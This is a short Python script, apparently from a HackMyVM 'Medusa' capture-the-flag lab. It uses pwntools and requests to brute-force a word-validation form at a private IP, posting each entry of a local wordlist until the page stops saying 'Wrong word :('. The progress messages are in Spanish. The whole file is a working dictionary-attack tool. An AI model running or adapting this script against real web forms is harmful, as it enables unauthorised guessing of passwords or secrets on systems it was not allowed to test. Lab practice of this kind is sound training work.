#!/usr/bin/python3 

from pwn import *
import requests

bar = log.progress("")
counter = 1

target = "http://192.168.1.75/hades/d00r_validation.php"

with open("/home/miguel7/Hackmyvm/Medusa/content/dicc.txt", "r") as file:
    for line in file:
        word = line.strip()
        bar.status(f"Probando word [{counter}/229]:{word}")
        request = requests.post(target, data={"word":word})
        counter += 1

        if "Wrong word :( "not in request.text:
            bar.success(f"La palabra {word} es valido")
            exit(0)
